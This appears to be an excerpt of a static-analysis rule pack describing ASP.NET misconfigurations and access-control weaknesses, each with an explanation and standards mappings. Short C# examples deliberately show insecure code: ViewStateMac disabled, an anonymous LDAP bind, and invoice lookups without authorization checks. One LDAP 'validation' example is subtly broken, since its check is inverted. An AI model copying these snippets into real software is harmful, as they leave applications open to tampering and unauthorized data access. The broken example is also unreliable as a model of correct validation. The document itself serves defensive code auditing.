    <internalKey>Security Features/ASP.NET Misconfiguration/Header Checking Disabled(header_checking_disabled)</internalKey>
    <name>ASP.NET Misconfiguration: Header Checking Disabled(header_checking_disabled)</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Disabling header checking opens the door for attackers to perform header manipulation attacks such as HTTP Response Splitting.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  By default, the .NET framework prevents new line characters from being sent to APIs that set header values. However, this behavior can be disabled in configuration files by setting the <code>enableHeaderChecking</code> attribute on the <code>&lt;httpRuntime&gt;</code> tag to <code>false</code>.<br>When this check is disabled, code that allows user input to reach header setting APIs is vulnerable to attacks like HTTP Response Splitting.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 113</em> <br></p>
																									   <p>[11]  <em>httpRuntime Element</em> Microsoft<br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_asp_net_misconfiguration_missing_error_handling</key>
    <internalKey>Security Features/ASP.NET Misconfiguration/Missing Error Handling</internalKey>
    <name>ASP.NET Misconfiguration: Missing Error Handling</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An ASP .NET application must enable custom error pages in order to prevent attackers from mining information from the framework's built-in error responses.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  ASP .NET applications should be configured to use custom error pages instead of the framework default page. The default error page gives detailed information about the error that occurred, and should not be used in production environments. The <code>mode</code> attribute of the <code>&lt;customErrors&gt;</code> tag defines whether custom or default error pages are used.<br><br>Attackers can leverage the additional information provided by a default error page to mount attacks targeted on the framework, database, or other resources used by the application.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[10]  <em>ASP.Net Settings Schema: <customeErrors> Element</em> Microsoft<br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 12</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_asp_net_misconfiguration_persistent_authentication</key>
    <internalKey>Security Features/ASP.NET Misconfiguration/Persistent Authentication</internalKey>
    <name>ASP.NET Misconfiguration: Persistent Authentication</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Persistent authentication tickets leave users vulnerable to session hijacking.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The <code>FormsAuthentication.RedirectFromLoginPage()</code> method issues an authentication ticket, which allows users to remain authenticated for a specified period of time. When the method is invoked with the second argument <code>false</code>, it issues a temporary authentication ticket that remains valid for a period of time configured in <code>web.config</code>. When invoked with the second argument <code>true</code>, the method issues a persistent authentication ticket. On .NET 2.0, the lifetime of the persistent ticket respects the value in <code>web.config</code>, but on .NET 1.1, the persistent authentication ticket has a ridiculously long default lifetime -- fifty years.<br><br>Allowing persistent authentication tickets to survive for a long period of time leaves users and the system vulnerable in the following ways:<br><br>It expands the period of exposure to session hijacking attacks for users who fail to log out.<br><br>It increases the average number of valid session identifiers available for an attacker to guess.<br><br>It lengthens the duration of exploit when an attacker succeeds in hijacking a user's session.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A2 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A7 Broken Authentication and Session Management</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3090 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3405 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3405 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3405 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3405 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 302</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M9 Improper Session Handling</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-23 Session Authenticity (P1)</em> <br></p>
																									   <p>[18] Jeff Prosise <em>The Keep Sites Running Smoothly By Avoiding These 10 Common ASP.NET Pitfalls</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_asp_net_misconfiguration_viewstatemac_disabled</key>
    <internalKey>Security Features/ASP.NET Misconfiguration/ViewStateMac Disabled</internalKey>
    <name>ASP.NET Misconfiguration: ViewStateMac Disabled</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Disabling the view state message authentication check (MAC) can allow attackers to modify the view state.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  In ASP.NET, the view state is a mechanism to persist state in web forms across postbacks. Data stored in the view state is not trustworthy because there is no mechanism for preventing replay attacks. Trusting the view state is particularly dangerous when the view state message authentication check is disabled. Disabling this check allows attackers to make arbitrary changes to the data stored in the view state and can open the door for attacks against code that trusts the view state. Attackers might use this kind of error to defeat authentication checks or alter item pricing.<br><br><br><b>Example:</b> The following code disables view state message authentication checks.<br><pre><br>Page.EnableViewStateMac = false;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Michal Zalewski <em>ASP.NET __VIEWSTATE crypto validation prone to replay attacks</em> <br></p>
																									   <p>[5] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[6] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 353</em> <br></p>
																									   <p>[7] Scott on Writing <em>Don't Trust ViewState</em> <br></p>
																									   <p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[13]  <em>Understanding ASP.NET View State</em> Microsoft<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_asp_net_misconfiguration_viewstatemac_disabled_viewstatemac_disabled</key>
    <internalKey>Security Features/ASP.NET Misconfiguration/ViewStateMac Disabled(viewstatemac_disabled)</internalKey>
    <name>ASP.NET Misconfiguration: ViewStateMac Disabled(viewstatemac_disabled)</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Disabling the view state message authentication check (MAC) can allow attackers to modify the View State.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  In ASP.NET, the view state is a mechanism to persist state in web forms across postbacks. Data stored in the view state is not trustworthy because there is no mechanism for preventing replay attacks. Trusting the view state is particularly dangerous when the view state message authentication check is disabled. Disabling this check allows attackers to make arbitrary changes to the data stored in the view state and can open the door for attacks against code that trusts the view state. Attackers might use this kind of error to defeat authentication checks or alter item pricing.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Michal Zalewski <em>ASP.NET __VIEWSTATE crypto validation prone to replay attacks</em> <br></p>
																									   <p>[5] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[6] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 353</em> <br></p>
																									   <p>[7] Scott on Writing <em>Don't Trust ViewState</em> <br></p>
																									   <p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[13]  <em>Understanding ASP.NET View State</em> Microsoft<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_access_control_anonymous_ldap_bind</key>
    <internalKey>Security Features/Access Control/Anonymous LDAP Bind</internalKey>
    <name>Access Control: Anonymous LDAP Bind</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Without proper access control, executing an LDAP statement that contains a user-controlled value can allow an attacker to access unauthorized records.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Executing LDAP queries under an anonymous bind, effectively without authentication, can allow an attacker to abuse a poorly configured LDAP environment.<br><br><b>Example 1:</b> The following code creates the <code>DirectoryEntry de</code> using an anonymous bind.<br><br><pre><br>...<br>de = new DirectoryEntry("LDAP://ad.example.com:389/ou=People,dc=example,dc=com");<br>...<br></pre><br><br>All LDAP queries executed against <code>de</code> will be performed without authentication and access control. An attacker may be able to manipulate one of these queries in an unexpected way to gain access to records that would otherwise be protected by the directory's access control mechanism.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A10 Failure to Restrict URL Access</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A7 Missing Function Level Access Control</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A8 Failure to Restrict URL Access</em> <br></p>
																									   <p>[5] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.1 CAT II</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 285</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authorization</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 285</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 285</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 863</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.10, Requirement 7.2</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.2, Requirement 7.2</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8, Requirement 7.2</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8, Requirement 7.2</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_access_control_database</key>
    <internalKey>Security Features/Access Control/Database</internalKey>
    <name>Access Control: Database</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Without proper access control, executing a SQL statement that contains a user-controlled primary key can allow an attacker to view unauthorized records.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Database access control errors occur when:<br><br>1. Data enters a program from an untrusted source.<br><br>2. The data is used to specify the value of a primary key in a SQL query.<br><br><br><IfNotDef var="ConditionalDescriptions"><br><b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user.<br><pre><br>...<br>int16 id = System.Convert.ToInt16(invoiceID.Text);<br>SqlCommand query = new SqlCommand(<br>            "SELECT * FROM invoices WHERE id = @id", conn);<br>query.Parameters.AddWithValue("@id", id);<br>SqlDataReader objReader = query.ExecuteReader();<br>...<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"><br><ConditionalText condition="sink:System.Data"><br><b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user.<br><pre><br>...<br>int16 id = System.Convert.ToInt16(invoiceID.Text);<br>SqlCommand query = new SqlCommand(<br>            "SELECT * FROM invoices WHERE id = @id", conn);<br>query.Parameters.AddWithValue("@id", id);<br>SqlDataReader objReader = query.ExecuteReader();<br>...<br></pre><br></ConditionalText><br><ConditionalText condition="sink:NHibernate"><br><b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user.<br><pre><br>...<br>int16 id = System.Convert.ToInt16(invoiceID.Text);<br>Query query = sess.CreateQuery("SELECT * FROM invoices WHERE id = ?");<br>query.SetInt16(0, id);<br>List&lt;Invoice&gt; items = query.List&lt;Invoice&gt;();<br></pre><br><br><b>Example 2:</b> The following code performs the analogous query using NHibernate's HQL syntax and named parameters.<br><pre><br>...<br>int16 id = System.Convert.ToInt16(invoiceID.Text);<br>Query query = sess.CreateQuery("FROM Invoice inv WHERE inv.Id = :id");<br>query.SetInt16("id", id);<br>List&lt;Invoice&gt; items = query.List&lt;Invoice&gt;();<br></pre><br></ConditionalText><br><ConditionalText condition="sink:SubSonic"><br><b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user.<br><pre><br>...<br>int16 id = System.Convert.ToInt16(invoiceID.Text);<br>string query = new SqlCommand(<br>            "SELECT * FROM invoices WHERE id = @id", conn);<br>Object[] parameters = { id };<br>IDataReader responseReader = new InlineQuery().ExecuteReader(query, parameters);<br>...<br></pre><br><br><b>Example 2:</b> The following code uses SubSonic 2's simple query tools to achieve the same effect.<br><pre><br>...<br>int16 id = System.Convert.ToInt16(invoiceID.Text);<br>InvoiceCollection inv = new Select().From("invoices").<br>            Where("id").IsEqualTo(id).ExecuteAsCollection&lt;InvoiceCollection&gt;();<br></pre><br><br><b>Example 3:</b> The following is the ActiveRecord Fluent Query version of the above examples, implemented in SubSonic 3.<br><pre><br>...<br>int16 id = System.Convert.ToInt16(invoiceID.Text);<br>List&lt;Invoice&gt; invoices = db.Select.From&lt;Invoice&gt;().<br>            Where(InvoiceTable.IDColumn).IsEqualTo(id).ExecuteTypedList&lt;Invoice&gt;();<br></pre><br></ConditionalText><br><ConditionalText condition="sink:Castle.ActiveRecord"><br><b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user.<br><pre><br>...<br>int16 id = System.Convert.ToInt16(invoiceID.Text);<br>string queryString = "SELECT * FROM invoices WHERE id = :id";<br>SimpleQuery&lt;Invoice&gt; q = new SimpleQuery(queryString);<br>q.SetParameter("id", id);<br>Invoice[] invoices = (Invoice []) q.Execute();<br></pre><br></ConditionalText><br><ConditionalText condition="sink:!System.Data sink:!NHibernate sink:!SubSonic sink:!Castle.ActiveRecord"><br><b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user.<br><br><pre><br>...<br>int16 id = System.Convert.ToInt16(invoiceID.Text);<br>SqlCommand query = new SqlCommand(<br>            "SELECT * FROM invoices WHERE id = @id", conn);<br>query.Parameters.AddWithValue("@id", id);<br>SqlDataReader objReader = query.ExecuteReader();<br>...<br></pre><br></ConditionalText><br></IfDef><br><br>The problem is that the developer has failed to consider all of the possible values of <code>id</code>. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker can bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user.<br><br><IfDef var="ConditionalDescriptions"></IfDef><br><IfNotDef var="ConditionalDescriptions"><br>A number of modern web frameworks provide mechanisms for performing validation of user input. ASP.NET Request Validation and WCF are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HP Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. In case of ASP.NET Request Validation, we also provide evidence for when validation is explicitly disabled. We refer to this feature as Context-Sensitive Ranking. To further assist the HP Fortify user with the auditing process, the HP Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.<br></IfNotDef>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 566</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authorization</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 863</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.2</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[20] S. J. Friedl <em>SQL Injection Attacks by Example</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_access_control_ldap</key>
    <internalKey>Security Features/Access Control/LDAP</internalKey>
    <name>Access Control: LDAP</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Without proper access control, executing an LDAP statement that contains a user-controlled value can allow an attacker to access unauthorized directory entries.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Database access control errors occur when:<br><br>1.	Data enters a program from an untrusted source.<br><br>2.	The data is used to specify a data value in an LDAP query.<br><br><b>Example 1:</b> The employee ID of the current authenticated user is automatically submitted with each request by the client-side interface. The following code properly validates an employee name using a whitelist before using it to construct an LDAP query. This validation prevents LDAP injection vulnerabilities, but may still leave the code vulnerable.<br><br><pre><br>...<br>string whitelist = @"^[a-zA-Z\-\.']$";<br>string employee = empName.Text.trim();<br>Regex pattern = new Regex(whitelist);<br><br>if(!pattern.IsMatch(employee)) {<br>  DirectorySearcher src =<br>           new DirectorySearcher("(empID=" + employee + ")");<br>  src.SearchRoot = de;<br>  src.SearchScope = SearchScope.Subtree;<br><br>  foreach(SearchResult res in src.FindAll()) {<br>    ...<br>  }<br>}<br></pre><br><br>The problem is that the developer has failed to consider what would happen if an attacker provides alternate values of <code>empName</code>. Although the interface automatically submits the employee ID of the current user, an attacker could submit an alternative value as part of a malicious request. Because the code in this example executes the query under an anonymous bind, it will return the directory entry for any valid employee ID, regardless of the identity of the current authenticated user.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
